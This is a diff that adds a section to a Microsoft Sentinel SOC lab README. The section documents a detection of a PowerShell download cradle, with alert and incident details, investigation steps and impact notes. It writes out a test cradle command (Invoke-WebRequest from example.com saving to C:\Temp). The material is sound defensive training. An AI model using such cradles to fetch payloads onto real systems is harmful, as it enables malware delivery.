@@ -1033,4 +1033,278 @@ Early detection and investigation can help defenders contain the attacker before
 
 ⬆️ [**Back to Detection Validation Summary**](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Detection/README.md#-detection-validation-summary)
 
+---
 
+# 🚨 Download Cradle Detection
+
+## 🎯 Detection Overview
+
+This detection demonstrates Microsoft Sentinel identifying a **Download Cradle** execution. A download cradle is a common technique where an attacker uses legitimate system tools, such as PowerShell, to download a malicious payload from a remote server to the compromised endpoint.
+
+The analytics rule automatically identified the suspicious PowerShell command parameters and generated a **Medium severity alert**, allowing SOC analysts to investigate the potential command and control (C2) activity and payload delivery.
+
+---
+
+## 📖 Attack Scenario
+
+Attackers frequently use "living off the land" binaries (LOLBins) like PowerShell to execute download cradles. Instead of dropping a bulky executable directly on the disk, the attacker executes a lightweight command that reaches out to an external server to fetch the second-stage payload. 
+
+Microsoft Sentinel detected this activity by monitoring PowerShell execution logs for specific cmdlets and arguments, such as `Invoke-WebRequest` combined with an `-OutFile` parameter.
+
+---
+
+# 🚨 Alert Generated
+
+## Alert Summary
+
+| Property | Value |
+|----------|-------|
+| **Alert Name** | Download Cradle Detection |
+| **Severity** | Medium |
+| **Status** | New |
+| **Classification** | Not Set |
+| **Detection Source** | Scheduled detection |
+| **Service Source** | Microsoft Sentinel |
+| **Categories** | Command and Control |
+| **Analytics Rule** | Download Cradle Detection |
+
+---
+
+## Alert Description
+
+The alert was triggered after Microsoft Sentinel detected PowerShell commands used to download payloads from remote servers. 
+
+The specific command line observed was:
+`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest https://example.com -OutFile C:\Temp\test.html"`
+
+The activity involved:
+
+- 👤 **Account:** `Vm1\Sia123`
+- 💻 **Computer:** `Vm1`
+
+---
+
+## Alert Workflow
+
+```text
+Attacker gains access / executes command
+          │
+          ▼
+Executes PowerShell Download Cradle
+(Command and Control)
+          │
+          ▼
+Network request to external URL
+          │
+          ▼
+Payload downloaded to local disk
+          │
+          ▼
+Microsoft Sentinel Analytics Rule
+          │
+          ▼
+Medium Severity Alert Generated
+          │
+          ▼
+Microsoft Defender Incident Created
+```
+
+---
+
+## 📸 Alert Overview
+
+> *(Insert Alert Overview Screenshot)*
+
+---
+
+## 📸 Alert Details
+
+> *(Insert Alert Details Screenshot)*
+
+---
+
+## 📸 Query Results
+
+> *(Insert Query Results Screenshot)*
+
+---
+
+# 🚔 Incident Created
+
+## Incident Summary
+
+| Property | Value |
+|----------|-------|
+| **Incident ID** | 59 |
+| **Incident Name** | Download Cradle Detection |
+| **Severity** | Medium |
+| **Status** | Active |
+| **Classification** | Unclassified |
+| **Assigned To** | Unassigned |
+| **Active Alerts** | 1 |
+| **Created Automatically** | Yes |
+
+---
+
+## Incident Correlation
+
+Microsoft Defender automatically created Incident 59 based on the scheduled detection alert from Microsoft Sentinel. 
+
+This incident provides the analyst with the necessary workspace to investigate the command execution, the target URL, and the impacted endpoint.
+
+---
+
+## 📸 Incident Overview
+
+> *(Insert Incident Overview Screenshot)*
+
+---
+
+# 🕸️ Attack Story
+
+The Attack Story provides a visual relationship between the entities involved in the incident.
+
+Microsoft Defender associated:
+
+- 💻 **Device:** `Vm1`
+- ⚙️ **Process:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Comman...`
+
+This allows analysts to quickly understand the execution chain on the affected endpoint.
+
+---
+
+## 📸 Attack Story
+
+> *(Insert Attack Story Screenshot)*
+
+---
+
+# 🔍 Investigation Graph
+
+The Investigation Graph automatically maps the entities associated with the incident.
+
+### Observed Entities
+
+| Entity Type | Entity |
+|-------------|--------|
+| **Device** | `Vm1` |
+| **Process** | `powershell.exe` |
+
+The graph allows the SOC analyst to visually pivot between the host and the executed process during the investigation.
+
+---
+
+## 📸 Investigation Graph
+
+> *(Insert Investigation Graph Screenshot)*
+
+---
+
+# 💻 Impacted Assets
+
+The incident identified the following impacted assets.
+
+## Device
+
+| Property | Value |
+|----------|-------|
+| **Device name** | `Vm1` |
+| **Risk Level** | None |
+
+---
+
+## User
+
+| Property | Value |
+|----------|-------|
+| **User** | `Vm1\Sia123` |
+
+---
+
+## 📸 Impacted Device
+
+> *(Insert Device Screenshot)*
+
+---
+
+## 📸 Impacted User
+
+> *(Insert User Screenshot)*
+
+---
+
+# 🧪 Evidence & Response
+
+Microsoft Defender identified a suspicious process execution as part of the evidence.
+
+The query results provided important forensic information regarding the event timeline and execution context.
+
+| Property | Value |
+|----------|-------|
+| **Entity Type** | Process |
+| **Verdict** | Suspicious |
+| **Account** | `Vm1\Sia123` |
+| **Computer** | `Vm1` |
+| **Time Generated** | Jul 25, 2026 11:07:57 PM |
+| **Command Line** | `... -Command "Invoke-WebRequest https://example.com -OutFile C:\Temp\test.html"` |
+
+---
+
+## 📸 Evidence & Response
+
+> *(Insert Evidence Screenshot)*
+
+---
+
+# 📋 Activities
+
+The Activities tab records automated actions performed during the incident lifecycle.
+
+For this incident:
+
+- 🚨 Alert 'Download Cradle Detection' was added to the incident.
+- 🤖 Activities were performed by Microsoft Defender XDR via automated triggers.
+
+The activity history provides an audit trail of the automated incident workflow.
+
+---
+
+## 📸 Activities
+
+> *(Insert Activities Screenshot)*
+
+---
+
+# 🛡️ SOC Analyst Investigation
+
+During investigation the analyst should:
+
+- 🔎 Verify the legitimacy of the target URL (`https://example.com`).
+- 🌐 Review network and proxy logs to determine if the connection to the URL was successful and if data was downloaded.
+- 📁 Inspect the file system for the presence of the downloaded file (`C:\Temp\test.html`) and analyze it for malicious content.
+- 👤 Confirm if the user `Vm1\Sia123` authorized this activity.
+- ⚙️ Identify the parent process that spawned the PowerShell instance to uncover the initial access vector.
+- 🔍 Search for execution of the downloaded file (e.g., child processes spawned from the downloaded payload).
+- 🚨 Isolate the affected endpoint (`Vm1`) if malicious payload execution is confirmed.
+
+---
+
+# 🎯 Security Impact
+
+A download cradle indicates that an attacker (or unauthorized software) is attempting to pull additional tools or payloads into the environment. 
+
+Detecting this behavior allows SOC analysts to intercept an attack in its early stages before the primary payload is executed.
+
+If successful, this attack chain could lead to:
+
+- 📥 Execution of Malware (Ransomware, RATs, Info Stealers)
+- 📡 Establishing Command and Control (C2) Communication
+- 🔄 Lateral Movement preparation
+- 🛡️ Establishing Persistence within the environment
+
+---
+
+⬆️ [**Back to Detection Validation Summary**](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Detection/README.md#-detection-validation-summary)
+
+
+---
